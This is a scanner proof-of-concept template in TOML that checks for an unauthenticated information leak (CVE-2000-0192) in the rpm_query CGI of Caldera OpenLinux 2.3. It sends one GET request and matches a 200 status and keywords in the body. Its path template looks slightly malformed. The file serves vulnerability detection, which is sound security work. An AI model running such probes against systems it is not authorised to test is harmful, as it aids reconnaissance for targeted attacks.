[info]
author = "AVE"
description = "向 Caldera OpenLinux 2.3 的 /cgi-bin/rpm_query CGI 发送 GET 请求，检测是否返回 RPM 软件包列表信息。该 CGI 无需认证即可访问，泄露已安装软件包名称与版本，可被用于后续针对性攻击。"
id = "POC-AVE-2000-0169"
name = "Caldera OpenLinux 2.3 rpm_query CGI 信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-0169"]
vuln_id = [
    "CVE-2000-0192",
    "AVE-2000-0169",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/rpm_query"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "rpm_query",
    "RPM",
    "Query",
]
